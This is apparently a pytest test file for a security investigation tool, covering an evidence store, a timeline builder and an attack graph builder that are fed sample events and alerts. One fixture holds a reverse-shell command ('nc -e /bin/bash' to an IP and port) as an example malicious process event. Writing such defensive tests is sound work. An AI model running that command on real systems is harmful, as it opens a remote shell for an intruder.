from app.investigation.attack_graph import AttackGraphBuilder
from app.investigation.investigator import EvidenceStore, TimelineBuilder
from app.security.models import DetectionAlert, Evidence, Indicator, SecurityEvent


def test_evidence_store():
    store = EvidenceStore()
    evt = SecurityEvent(
        source="syslog",
        event_type="auth_failure",
        host_id="server-01",
        user_id="alice",
        src_ip="192.168.1.100"
    )
    store.add_event(evt)
    
    ev = Evidence(event_id=evt.event_id, observation="Invalid SSH password", source="syslog")
    store.add_evidence(ev)

    assert len(store.get_events_for_host("server-01")) == 1
    assert len(store.get_events_for_user("alice")) == 1
    assert len(store.get_events_for_ip("192.168.1.100")) == 1


def test_timeline_builder():
    events = [
        SecurityEvent(source="syslog", event_type="auth_failure", user_id="alice", command="login ssh"),
        SecurityEvent(source="auditd", event_type="process_spawn", user_id="alice", command="nc -e /bin/bash 10.0.0.1 4444"),
    ]
    timeline = TimelineBuilder.build_timeline(events)
    assert len(timeline) == 2
    assert timeline[0].step_index == 1
    assert timeline[1].step_index == 2
    assert timeline[1].actor == "alice"


def test_attack_graph_builder():
    builder = AttackGraphBuilder()
    evt = SecurityEvent(
        source="syslog",
        event_type="auth_failure",
        host_id="host-prod-01",
        user_id="attacker",
        process_name="python",
        src_ip="198.51.100.22",
        dst_ip="10.0.0.5",
        dst_port=4444
    )
    alert = DetectionAlert(
        title="Brute Force & C2 Egress",
        rule_id="RULE-001",
        events=[evt],
        indicators=[Indicator(indicator_type="IP", value="198.51.100.22")]
    )
    builder.add_alert(alert)

    graph_dict = builder.to_dict()
    assert len(graph_dict["nodes"]) >= 5
    assert len(graph_dict["edges"]) >= 4

    dot_str = builder.to_graphviz_dot()
    assert "digraph AttackGraph" in dot_str
    assert "host-prod-01" in dot_str
    assert "198.51.100.22" in dot_str

    paths = builder.get_attack_paths()
    assert isinstance(paths, list)
